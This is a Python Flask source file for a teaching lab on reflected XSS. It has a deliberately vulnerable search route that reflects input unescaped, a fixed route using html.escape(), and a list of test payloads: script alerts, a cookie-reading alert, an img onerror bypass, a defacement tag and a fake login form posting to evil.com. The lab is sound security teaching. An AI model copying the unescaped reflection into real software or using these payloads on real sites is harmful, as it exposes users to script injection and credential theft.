"""
=============================================================================
  Reflected XSS Demo — Vulnerable + Mitigated
  CyberSec Lab 3 — Cross-Site Scripting (Reflected XSS)
=============================================================================

This Flask application demonstrates:
  (a) A VULNERABLE search page that reflects user input without sanitization
  (b) A MITIGATED  search page that applies context-aware output encoding

Run:
    python app.py

Then visit:
    http://127.0.0.1:5000/
=============================================================================
"""

from flask import Flask, request
import html as html_mod  # Used for mitigation (output encoding)

app = Flask(__name__)

# ─── Fake product catalog (simulating a database) ───────────────────────────
PRODUCTS = [
    {"id": 1, "name": "Wireless Mouse",       "price": 25.99},
    {"id": 2, "name": "Mechanical Keyboard",   "price": 79.99},
    {"id": 3, "name": "USB-C Hub",             "price": 34.50},
    {"id": 4, "name": "Noise-Cancelling Headphones", "price": 149.00},
    {"id": 5, "name": "Webcam HD 1080p",       "price": 45.00},
    {"id": 6, "name": "Monitor Stand",         "price": 29.99},
]

# ═══════════════════════════════════════════════════════════════════════════
#  HOME PAGE
# ═══════════════════════════════════════════════════════════════════════════

HOME_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Reflected XSS Demo</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body {
    font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
    background:#0f0f23; color:#e0e0e0;
    min-height:100vh; display:flex; flex-direction:column;
    align-items:center; justify-content:center;
}
.container { max-width:800px; text-align:center; padding:40px; }
h1 { font-size:2.5rem; color:#00d4ff; margin-bottom:10px; }
.subtitle { color:#888; font-size:1.1rem; margin-bottom:40px; }
.cards { display:flex; gap:30px; justify-content:center; flex-wrap:wrap; }
.card {
    background:#1a1a2e; border:2px solid #333; border-radius:12px;
    padding:30px; width:320px; transition:all 0.3s;
    text-decoration:none; color:inherit;
}
.card:hover { transform:translateY(-5px); box-shadow:0 10px 30px rgba(0,0,0,0.5); }
.card.vulnerable { border-color:#ff4444; }
.card.vulnerable:hover { border-color:#ff6666; box-shadow:0 10px 30px rgba(255,68,68,0.2); }
.card.mitigated  { border-color:#00cc66; }
.card.mitigated:hover  { border-color:#00ff88; box-shadow:0 10px 30px rgba(0,204,102,0.2); }
.card h2 { font-size:1.4rem; margin-bottom:8px; }
.card.vulnerable h2 { color:#ff4444; }
.card.mitigated  h2 { color:#00cc66; }
.card .icon { font-size:3rem; margin-bottom:15px; }
.card p { color:#aaa; font-size:0.95rem; line-height:1.5; }
.badge {
    display:inline-block; padding:4px 12px; border-radius:20px;
    font-size:0.75rem; font-weight:bold; margin-top:15px; text-transform:uppercase;
}
.badge.danger { background:#ff4444; color:#fff; }
.badge.safe   { background:#00cc66; color:#fff; }
.footer { margin-top:50px; color:#555; font-size:0.85rem; }
</style>
</head>
<body>
<div class="container">
    <h1>&#128737; Reflected XSS Demo</h1>
    <p class="subtitle">CyberSec Lab 3 &mdash; Cross-Site Scripting (Reflected)</p>
    <div class="cards">
        <a href="/search/vulnerable" class="card vulnerable">
            <div class="icon">&#9888;&#65039;</div>
            <h2>Vulnerable Version</h2>
            <p>Search page that reflects user input <strong>without any encoding</strong>.
               Injected scripts execute in the browser.</p>
            <span class="badge danger">Exploitable</span>
        </a>
        <a href="/search/safe" class="card mitigated">
            <div class="icon">&#9989;</div>
            <h2>Mitigated Version</h2>
            <p>Same search page with <strong>context-aware output encoding</strong> applied.
               Injected scripts are rendered as harmless text.</p>
            <span class="badge safe">Secured</span>
        </a>
    </div>
    <p class="footer">
        For educational purposes only. Test only on your own applications.<br>
        Category: XSS &nbsp;|&nbsp; Variant: Reflected XSS
    </p>
</div>
</body>
</html>"""


def _build_code_box(is_safe):
    """Return the HTML for the code-explanation box."""
    if is_safe:
        accent = "#00cc66"
        label = "Mitigated Code Path (output encoding applied)"
        lines = [
            "# SAFE: User input is HTML-encoded before rendering",
            "query_display = html.escape(query)",
            "#   converts &lt; &gt; &amp; to &amp;lt; &amp;gt; &amp;amp;",
            "#",
            "# The browser sees encoded entities and renders them",
            "# as visible text, NOT as executable HTML/JS.",
        ]
    else:
        accent = "#ff4444"
        label = "Vulnerable Code Path (no encoding)"
        lines = [
            "# VULNERABLE: User input is directly embedded into HTML",
            "query_display = query   # &lt;-- raw input, no encoding!",
            "#",
            "# The query_display is placed inside:",
            '#   &lt;span class="results-query"&gt; {{ query_display }} &lt;/span&gt;',
            "#",
            "# Because there is NO encoding, the browser interprets",
            "# injected &lt;script&gt; tags as real HTML/JS and executes them.",
        ]
    code_text = "\n".join(lines)
    return (
        f'<div class="code-box">'
        f'<span class="label">{label}</span>'
        f"<code>{code_text}</code>"
        f"</div>"
    )


def _build_payloads_section(version):
    """Return the HTML for the test-payloads panel."""
    payloads = [
        (
            "Basic alert &mdash; proves script execution",
            f"/search/{version}?q=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        ),
        (
            "Cookie theft simulation",
            f"/search/{version}?q=%3Cscript%3Ealert(%27Cookies%3A%20%27%2Bdocument.cookie)%3C/script%3E",
            "&lt;script&gt;alert('Cookies: '+document.cookie)&lt;/script&gt;",
        ),
        (
            "Image tag with onerror &mdash; bypasses basic script-tag filters",
            f"/search/{version}?q=%3Cimg%20src%3Dx%20onerror%3Dalert(%27XSS-via-img%27)%3E",
            "&lt;img src=x onerror=alert('XSS-via-img')&gt;",
        ),
        (
            "HTML injection &mdash; defaces the page",
            f"/search/{version}?q=%3Ch1%20style%3D%22color%3Ared%22%3EHACKED!%3C/h1%3E",
            '&lt;h1 style="color:red"&gt;HACKED!&lt;/h1&gt;',
        ),
        (
            "Fake login form &mdash; phishing via reflected content",
            f"/search/{version}?q=%3Cform%20action%3D%22https%3A//evil.com/steal%22%3E%3Cinput%20placeholder%3D%22Enter%20password%22%3E%3Cbutton%3ELogin%3C/button%3E%3C/form%3E",
            '&lt;form action="https://evil.com/steal"&gt;...&lt;/form&gt;',
        ),
    ]
    items = ""
    for i, (desc, href, code) in enumerate(payloads, 1):
        items += (
            f'<div class="payload-item">'
            f'<div class="desc">{i}. {desc}</div>'
            f'<a href="{href}">{code}</a>'
            f"</div>"
        )
    return (
        f'<div class="payloads">'
        f"<h3>&#127919; Test Payloads (try these in the search box)</h3>"
        f"{items}"
        f"</div>"
    )


def build_search_page(query_display, results_html, version, is_safe):
    """Build the complete search page HTML."""
    accent = "#00cc66" if is_safe else "#ff4444"
    tag_label = "MITIGATED" if is_safe else "VULNERABLE"

    results_section = ""
    if query_display is not None:
        results_section = (
            f'<div class="results">'
            f'<h3>Search results for: <span class="results-query">{query_display}</span></h3>'
            f"{results_html}"
            f"</div>"
        )

    code_box = _build_code_box(is_safe)
    payloads = _build_payloads_section(version)

    # CSS is duplicated here for simplicity (single-file app)
    page = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Product Search ({version.title()})</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{
    font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
    background:#0f0f23; color:#e0e0e0; min-height:100vh; padding:30px;
}}
.header {{ display:flex; align-items:center; gap:15px; margin-bottom:30px; }}
.header a {{ color:#00d4ff; text-decoration:none; font-size:0.9rem; }}
.header h1 {{ font-size:1.6rem; color:{accent}; }}
.tag {{
    display:inline-block; padding:3px 10px; border-radius:20px;
    font-size:0.7rem; font-weight:bold; background:{accent};
    color:#fff; text-transform:uppercase;
}}
.search-box {{
    background:#1a1a2e; border:1px solid #333; border-radius:10px;
    padding:25px; margin-bottom:25px; max-width:700px;
}}
.search-box form {{ display:flex; gap:10px; }}
.search-box input[type="text"] {{
    flex:1; padding:12px 16px; border:1px solid #444; border-radius:6px;
    background:#0f0f23; color:#e0e0e0; font-size:1rem;
}}
.search-box input[type="text"]:focus {{ outline:none; border-color:{accent}; }}
.search-box button {{
    padding:12px 24px; background:{accent}; color:#fff; border:none;
    border-radius:6px; font-size:1rem; cursor:pointer; font-weight:bold;
}}
.results {{
    background:#1a1a2e; border:1px solid #333; border-radius:10px;
    padding:25px; max-width:700px; margin-bottom:25px;
}}
.results h3 {{ margin-bottom:15px; color:#ccc; }}
.results-query {{ color:{accent}; font-weight:bold; }}
table {{ width:100%; border-collapse:collapse; }}
th, td {{ text-align:left; padding:10px 12px; border-bottom:1px solid #2a2a3e; }}
th {{ color:#888; font-size:0.85rem; text-transform:uppercase; }}
td {{ color:#ddd; }}
.no-results {{ color:#888; font-style:italic; }}
.code-box {{
    background:#111; border:1px solid #333; border-radius:8px;
    padding:15px; margin-top:20px; max-width:700px;
    font-family:'Consolas','Courier New',monospace; font-size:0.85rem;
    color:#aaa; line-height:1.6;
}}
.code-box .label {{
    color:{accent}; font-weight:bold; margin-bottom:8px;
    display:block; font-family:'Segoe UI',sans-serif;
}}
.code-box code {{ color:#e0e0e0; white-space:pre-wrap; }}
.payloads {{
    background:#1a1a2e; border:1px solid #333; border-radius:10px;
    padding:25px; margin-top:25px; max-width:700px;
}}
.payloads h3 {{ color:#ff9900; margin-bottom:15px; }}
.payload-item {{
    background:#111; border:1px solid #333; border-radius:6px;
    padding:12px; margin-bottom:10px;
    font-family:'Consolas',monospace; font-size:0.85rem;
}}
.payload-item .desc {{
    color:#888; font-family:'Segoe UI',sans-serif; font-size:0.8rem;
    margin-bottom:5px;
}}
.payload-item a {{ color:#ff9900; text-decoration:none; word-break:break-all; }}
.payload-item a:hover {{ text-decoration:underline; }}
</style>
</head>
<body>
<div class="header">
    <a href="/">&larr; Home</a>
    <h1>&#128270; Product Search</h1>
    <span class="tag">{tag_label}</span>
</div>

<div class="search-box">
    <form method="GET" action="/search/{version}">
        <input type="text" name="q"
               placeholder="Search products (e.g. Mouse, Keyboard)...">
        <button type="submit">Search</button>
    </form>
</div>

{results_section}

{payloads}

{code_box}

</body>
</html>"""
    return page


# ═══════════════════════════════════════════════════════════════════════════
#  ROUTE: Home
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/")
def home():
    return HOME_PAGE


# ═══════════════════════════════════════════════════════════════════════════
#  ROUTE: VULNERABLE Search
#  Flaw: User input from ?q= is reflected directly into the HTML response
#        without any encoding or sanitization.
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/search/vulnerable")
def search_vulnerable():
    query = request.args.get("q", None)

    if query is None:
        return build_search_page(None, "", "vulnerable", is_safe=False)

    # ──────────────────────────────────────────────────────────────────
    #  ⚠️  VULNERABLE LINE: query is used AS-IS, no html.escape()!
    #  Root cause: User-controlled input is concatenated directly into
    #  the HTML response. The browser parses it as markup/script.
    # ──────────────────────────────────────────────────────────────────
    query_display = query  # ← THIS IS THE VULNERABILITY

    # Filter products (case-insensitive substring match)
    matches = [p for p in PRODUCTS if query.lower() in p["name"].lower()]

    if matches:
        rows = "".join(
            f'<tr><td>{p["id"]}</td><td>{p["name"]}</td>'
            f'<td>${p["price"]:.2f}</td></tr>'
            for p in matches
        )
        results_html = (
            '<table>'
            '<tr><th>#</th><th>Product</th><th>Price</th></tr>'
            f'{rows}'
            '</table>'
        )
    else:
        results_html = '<p class="no-results">No products found.</p>'

    return build_search_page(query_display, results_html, "vulnerable", is_safe=False)


# ═══════════════════════════════════════════════════════════════════════════
#  ROUTE: SAFE (Mitigated) Search
#  Fix:   html.escape() is applied to the query before embedding in HTML.
#         This is "context-aware output encoding" — the primary XSS defence.
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/search/safe")
def search_safe():
    query = request.args.get("q", None)

    if query is None:
        return build_search_page(None, "", "safe", is_safe=True)

    # ──────────────────────────────────────────────────────────────────
    #  ✅  MITIGATED LINE: html.escape() encodes special HTML chars
    #      < → &lt;   > → &gt;   & → &amp;   " → &quot;   ' → &#x27;
    #  The browser sees encoded entities and renders them as plain text,
    #  NOT as executable HTML or JavaScript.
    # ──────────────────────────────────────────────────────────────────
    query_display = html_mod.escape(query)  # ← THIS IS THE FIX

    # Filter products — same logic, safe display
    matches = [p for p in PRODUCTS if query.lower() in p["name"].lower()]

    if matches:
        rows = "".join(
            f'<tr><td>{p["id"]}</td>'
            f'<td>{html_mod.escape(p["name"])}</td>'
            f'<td>${p["price"]:.2f}</td></tr>'
            for p in matches
        )
        results_html = (
            '<table>'
            '<tr><th>#</th><th>Product</th><th>Price</th></tr>'
            f'{rows}'
            '</table>'
        )
    else:
        results_html = '<p class="no-results">No products found.</p>'

    return build_search_page(query_display, results_html, "safe", is_safe=True)


# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=" * 60)
    print("  Reflected XSS Demo Server")
    print("  Open http://127.0.0.1:5000/ in your browser")
    print("=" * 60)
    app.run(debug=True, port=5000)
